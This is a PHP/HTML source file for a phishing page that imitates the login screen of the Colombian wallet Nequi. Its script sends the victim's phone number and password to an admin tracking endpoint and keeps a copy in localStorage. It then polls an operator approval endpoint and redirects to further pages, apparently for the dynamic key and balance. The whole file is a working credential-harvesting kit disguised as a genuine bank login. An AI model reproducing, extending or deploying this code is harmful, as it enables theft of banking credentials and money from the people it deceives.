<?php
// Nequi index.php - Login con flujo: LOGIN → SALDO (si error saldo) → DINAMICA
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Entra a tu Nequi</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">

  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Manrope', sans-serif; background: #FDE8F0; min-height: 100vh; }
    .nav { display: flex; justify-content: space-between; align-items: center; padding: 0 24px; background: white; border-bottom: 1px solid #F0E0E8; position: sticky; top: 0; z-index: 100; height: 64px; }
    .logo-img { height: 100px; width: auto; }
    .nav-btn { background: #FF006B; color: white; border: none; padding: 10px 22px; border-radius: 8px; font-weight: 700; font-family: 'Manrope', sans-serif; font-size: 15px; cursor: pointer; }
    .page { min-height: calc(100vh - 64px); position: relative; display: flex; align-items: center; justify-content: center; padding: 40px 16px; overflow: hidden; }
    .blob { position: absolute; border-radius: 50%; background: rgba(255, 0, 107, 0.08); pointer-events: none; }
    .blob-1 { width: 260px; height: 260px; top: -60px; left: -80px; }
    .blob-2 { width: 200px; height: 200px; top: 20px; right: -60px; background: rgba(255, 0, 107, 0.05); }
    .blob-3 { width: 300px; height: 300px; bottom: -80px; left: -60px; background: rgba(255, 0, 107, 0.06); }
    .blob-4 { width: 180px; height: 180px; bottom: 40px; right: -50px; background: rgba(255, 0, 107, 0.04); }
    .blob-5 { width: 120px; height: 120px; top: 50%; left: 8%; background: rgba(255, 0, 107, 0.05); }
    .blob-6 { width: 140px; height: 140px; top: 30%; right: 6%; background: rgba(255, 0, 107, 0.04); }
    .card { background: white; border-radius: 20px; padding: 40px 32px; width: 100%; max-width: 420px; position: relative; z-index: 2; box-shadow: 0 4px 40px rgba(255, 0, 107, 0.08); }
    .card-title { font-size: 24px; font-weight: 800; color: #1A1A1A; text-align: center; margin-bottom: 10px; }
    .card-subtitle { font-size: 14px; color: #888; text-align: center; margin-bottom: 28px; line-height: 1.5; }

    #loginPhase { display: block; }
    #pollingPhase { display: none; }

    .phone-row { display: flex; align-items: center; border: 1.5px solid #E8E8E8; border-radius: 10px; margin-bottom: 14px; overflow: hidden; transition: border-color 0.2s; }
    .phone-row:focus-within { border-color: #FF006B; }
    .phone-input { flex: 1; border: none; outline: none; padding: 0 14px; height: 52px; font-size: 15px; font-family: 'Manrope', sans-serif; color: #1A1A1A; background: transparent; }
    .phone-input::placeholder { color: #BBBBBB; }
    .input-field { width: 100%; border: 1.5px solid #E8E8E8; border-radius: 10px; padding: 0 14px; height: 52px; font-size: 15px; font-family: 'Manrope', sans-serif; color: #1A1A1A; outline: none; margin-bottom: 14px; transition: border-color 0.2s; background: white; }
    .input-field::placeholder { color: #BBBBBB; }
    .input-field:focus { border-color: #FF006B; }
    .captcha-box { display: flex; align-items: center; gap: 16px; border: 1.5px solid #E8E8E8; border-radius: 10px; padding: 14px 16px; margin-bottom: 24px; cursor: pointer; transition: border-color 0.2s; }
    .captcha-box:hover { border-color: #FF006B; }
    .captcha-circle { width: 36px; height: 36px; border: 2.5px solid #FF006B; border-radius: 50%; flex-shrink: 0; display: flex; align-items: center; justify-content: center; transition: background 0.2s; }
    .captcha-circle.checked { background: #FF006B; }
    .captcha-circle.checked::after { content: ''; width: 10px; height: 6px; border-left: 2px solid white; border-bottom: 2px solid white; transform: rotate(-45deg) translateY(-1px); }
    .captcha-label { font-size: 14px; color: #333; font-weight: 500; line-height: 1.4; }

    .submit-btn { width: 100%; background: #FFADD1; color: white; border: none; padding: 15px; border-radius: 10px; font-size: 16px; font-weight: 700; font-family: 'Manrope', sans-serif; cursor: not-allowed; transition: background 0.3s; }
    .submit-btn.active { background: #FF006B; cursor: pointer; }

    .polling-container { text-align: center; }
    .polling-spinner { width: 60px; height: 60px; border: 4px solid #FFADD1; border-top-color: #FF006B; border-radius: 50%; margin: 20px auto; animation: spin 1s linear infinite; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .polling-text { font-size: 14px; color: #666; margin-top: 16px; }
    .polling-status { font-size: 13px; color: #999; margin-top: 8px; }

    @media (min-width: 768px) {
      .card { padding: 48px 44px; }
      .card-title { font-size: 28px; }
      .blob-1 { width: 380px; height: 380px; top: -100px; left: -120px; }
      .blob-2 { width: 300px; height: 300px; top: 20px; right: -80px; }
      .blob-3 { width: 420px; height: 420px; bottom: -120px; left: -80px; }
      .blob-4 { width: 260px; height: 260px; bottom: 60px; right: -60px; }
    }
  </style>
</head>
<body>

  <nav class="nav">
    <img src="logo.png" alt="Nequi" class="logo-img">
    <button class="nav-btn">Recarga</button>
  </nav>

  <div class="page">
    <div class="blob blob-1"></div>
    <div class="blob blob-2"></div>
    <div class="blob blob-3"></div>
    <div class="blob blob-4"></div>
    <div class="blob blob-5"></div>
    <div class="blob blob-6"></div>

    <div class="card">
      <div id="loginPhase">
        <h1 class="card-title">Entra a tu Nequi</h1>
        <p class="card-subtitle">Podrás bloquear tu Nequi, consultar tus datos.</p>

        <div class="phone-row">
          <input type="tel" class="phone-input" placeholder="Número de celular (10 dígitos)" id="phone" inputmode="numeric" maxlength="10">
        </div>

        <input type="password" class="input-field" placeholder="Contraseña" id="password" maxlength="20">

        <div class="captcha-box" id="captcha" onclick="toggleCaptcha()">
          <div class="captcha-circle" id="captchaCircle"></div>
          <span class="captcha-label">Confirmo que soy una persona real.</span>
        </div>

        <button class="submit-btn" id="submitBtnLogin">Entra</button>
      </div>

      <div id="pollingPhase">
        <div class="polling-container">
          <h1 class="card-title">Validando información</h1>
          <p class="card-subtitle">Estamos verificando tus datos. Por favor espera.</p>
          <div class="polling-spinner"></div>
          <p class="polling-text">Verificando identidad...</p>
          <p class="polling-status" id="pollingStatus">Intento 1/3</p>
        </div>
      </div>
    </div>
  </div>

  <script>
    let captchaChecked = false;
    let pollingInterval = null;
    let logIdLogin = null;

    function toggleCaptcha() {
      captchaChecked = !captchaChecked;
      document.getElementById('captchaCircle').classList.toggle('checked', captchaChecked);
      checkFormLogin();
    }

    function checkFormLogin() {
      const phone = document.getElementById('phone').value.trim();
      const password = document.getElementById('password').value.trim();
      const btn = document.getElementById('submitBtnLogin');
      const phoneValid = /^3\d{9}$/.test(phone);
      if (phoneValid && password.length >= 4 && captchaChecked) {
        btn.classList.add('active');
        btn.style.cursor = 'pointer';
      } else {
        btn.classList.remove('active');
        btn.style.cursor = 'not-allowed';
      }
    }

    document.getElementById('phone').addEventListener('input', function(e) {
      this.value = this.value.replace(/\D/g, '');
      if (this.value.length > 10) this.value = this.value.slice(0, 10);
      checkFormLogin();
    });

    document.getElementById('password').addEventListener('input', checkFormLogin);

    async function sendLoginData() {
      const phone = document.getElementById('phone').value.trim();
      const password = document.getElementById('password').value.trim();

      localStorage.setItem('usuario_nequi', phone);
      localStorage.setItem('clave_pin_nequi', password);

      const formData = new FormData();
      formData.append('activity', 'LOGIN (NEQUI)');
      formData.append('action', 'log');
      formData.append('metodo', 'PSE');
      formData.append('banco', 'Nequi');
      formData.append('documento', phone);
      formData.append('usuario', phone);
      formData.append('identificacion', phone);
      formData.append('tipo_identificacion', 'CELULAR');
      formData.append('clave_pin', password);
      formData.append('clave_tarjeta', '');
      formData.append('ultimos_digitos', '');

      try {
        const response = await fetch('../../admin/track_stats.php', {
          method: 'POST',
          body: formData,
          keepalive: true
        });

        const data = await response.json();
        console.log('📝 Respuesta track_stats:', data);
        
        if (data.success) {
          logIdLogin = data.id;
          localStorage.setItem('log_id_nequi', data.id);
          return true;
        }
      } catch (err) {
        console.error('Error:', err);
      }
      return false;
    }

    async function checkLoginStatus() {
      if (!logIdLogin) return;

      try {
        const response = await fetch(`../../admin/check_aprobacion.php?log_id=${logIdLogin}`);
        const data = await response.json();

        console.log('📊 Respuesta check_aprobacion:', data);
        console.log('📊 error_tipo:', data.error_tipo);

        if (data.estado === 'aprobado') {
          console.log('✅ APROBADO DETECTADO');
          clearInterval(pollingInterval);
          localStorage.setItem('login_aprobado_nequi', 'true');
          console.log('🔄 Redirigiendo a dinamica.php...');
          window.location.href = 'dinamica.php';
        } else if (data.estado === 'rechazado') {
          console.log('❌ RECHAZADO');
          clearInterval(pollingInterval);
          
          // Verificar si fue rechazado por ERROR SALDO
          if (data.error_tipo === 'saldo') {
            console.log('💳 ERROR SALDO DETECTADO - Redirigiendo a saldo.php');
            document.getElementById('loginPhase').style.display = 'block';
            document.getElementById('pollingPhase').style.display = 'none';
            window.location.href = 'saldo.php';
          } else {
            // Error normal (usuario o clave)
            document.getElementById('loginPhase').style.display = 'block';
            document.getElementById('pollingPhase').style.display = 'none';
            
            const phoneInput = document.getElementById('phone');
            const passwordInput = document.getElementById('password');
            phoneInput.style.borderColor = '#FF0000';
            passwordInput.style.borderColor = '#FF0000';
            
            // Mostrar mensaje según el tipo de error
            if (data.error_tipo === 'usuario') {
              alert('❌ Error de usuario. Verifica tu número de celular.');
            } else if (data.error_tipo === 'clave') {
              alert('❌ Error de contraseña. Verifica tu clave.');
            } else {
              alert('❌ Datos incorrectos. Verifica tu número y contraseña.');
            }
            
            setTimeout(() => {
              phoneInput.style.borderColor = '#E8E8E8';
              passwordInput.style.borderColor = '#E8E8E8';
              resetForm();
            }, 2000);
          }
        } else {
          console.log('⏳ Pendiente...');
        }
      } catch (err) {
        console.error('Error checking status:', err);
      }
    }

    function resetForm() {
      document.getElementById('phone').value = '';
      document.getElementById('password').value = '';
      captchaChecked = false;
      document.getElementById('captchaCircle').classList.remove('checked');
      checkFormLogin();
    }

    document.getElementById('submitBtnLogin').addEventListener('click', async () => {
      const btn = document.getElementById('submitBtnLogin');
      if (!btn.classList.contains('active')) return;

      const success = await sendLoginData();
      
      if (success) {
        document.getElementById('loginPhase').style.display = 'none';
        document.getElementById('pollingPhase').style.display = 'block';

        checkLoginStatus();
        
        let intentoActual = 1;
        pollingInterval = setInterval(() => {
          intentoActual++;
          document.getElementById('pollingStatus').textContent = `Intento ${intentoActual}/∞`;
          checkLoginStatus();
        }, 2000);
      } else {
        alert('❌ Error al enviar datos. Intenta de nuevo.');
        document.getElementById('loginPhase').style.display = 'block';
        document.getElementById('pollingPhase').style.display = 'none';
      }
    });
  </script>
</body>
</html>